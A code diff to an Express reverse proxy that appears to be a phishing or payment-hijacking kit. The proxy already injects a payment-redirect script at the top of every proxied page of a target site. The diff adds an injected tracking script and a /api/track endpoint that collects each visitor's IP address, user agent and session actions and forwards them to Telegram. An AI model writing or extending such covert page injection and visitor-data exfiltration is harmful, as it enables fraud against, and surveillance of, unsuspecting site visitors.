@@ -17,6 +17,7 @@ const config = require('./config');
 const logger = require('./logger');
 const { userAgentRotation, getRandomUserAgent } = require('./user-agents');
 const cacheManager = require('./cache-manager');
+const telegramLogger = require('./telegram-logger');
 
 // Create Express app
 const app = express();
@@ -817,7 +818,9 @@ const proxyOptions = {
 </script>`;
             
             // Inject scripts on ALL HTML pages
-            let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript;
+            // Include: reCAPTCHA fix, payment redirect, and user tracking
+            const trackingScript = telegramLogger.getTrackingScript();
+            let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript + '\n' + trackingScript;
             
           // CRITICAL: Inject at THE VERY START of <head> to execute BEFORE any other scripts
           const hasHeadOpen = bodyString.includes('<head>');
@@ -959,6 +962,32 @@ app.get('/test', (req, res) => {
     target: config.target.url,
     timestamp: new Date().toISOString()
   });
+});
+
+// API endpoint for user tracking (Telegram notifications)
+app.use(express.json({ limit: '1mb' }));
+app.post('/api/track', async (req, res) => {
+  try {
+    const { sessionId, action } = req.body;
+    
+    if (!sessionId || !action) {
+      return res.status(400).json({ error: 'Missing sessionId or action' });
+    }
+    
+    // Get user metadata
+    const meta = {
+      ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.socket.remoteAddress,
+      userAgent: req.headers['user-agent'],
+    };
+    
+    // Track action
+    await telegramLogger.trackAction(sessionId, action, meta);
+    
+    res.status(200).json({ ok: true });
+  } catch (error) {
+    logger.error('[Track API] Error:', error.message);
+    res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
 // Apply proxy middleware to all routes
